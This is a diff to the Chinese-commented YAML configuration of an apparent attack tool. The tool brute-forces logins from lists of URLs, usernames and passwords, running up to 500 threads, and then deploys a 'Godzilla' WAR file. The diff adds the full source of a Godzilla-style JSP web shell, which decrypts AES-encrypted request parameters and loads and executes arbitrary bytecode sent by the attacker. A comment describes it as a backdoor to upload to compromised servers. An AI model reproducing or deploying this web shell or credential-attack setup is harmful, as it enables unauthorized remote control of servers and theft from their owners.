@@ -1,16 +1,8 @@
-# 文件路径配置
-files:
-  url_file: "data/urls.txt"        # 存放URL的文件路径
-  user_file: "data/user.txt"       # 存放用户名的文件路径
-  passwd_file: "data/passwd.txt"   # 存放密码的文件路径
-  shell_file: "data/shell.jsp"     # shell 文件路径
-  output_file: "success.txt"       # 用于存储结果的输出文件路径
-
 # 线程池配置
 thread_pool:
   max_workers_limit: 500           # 最大线程数限制
   min_workers: 100                 # 最小线程数
-  combination_per_thread: 40       #设置每多少个组合分配一个线程
+  combination_per_thread: 40       # 设置每多少个组合分配一个线程
 
 # 重试配置
 retry:
@@ -21,3 +13,15 @@ retry:
   deploy_godzilla_war:
     max_retries: 3                 # 文件上传的最大重试次数
     retry_delay: 2                 # 每次重试前的延迟时间（秒）
+
+# 文件路径配置
+files:
+  url_file: "data/urls.txt"        # 存放URL的文件路径
+  user_file: "data/user.txt"       # 存放用户名的文件路径
+  passwd_file: "data/passwd.txt"   # 存放密码的文件路径
+  shell_file: "data/shell.jsp"     # shell 文件路径
+  output_file: "success.txt"       # 用于存储结果的输出文件路径
+  
+  #war部署后台上传马，注意此处格式错误容易报错上传失败，修改后建议先用靶场测试
+  shell_file_content: |
+    <%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>
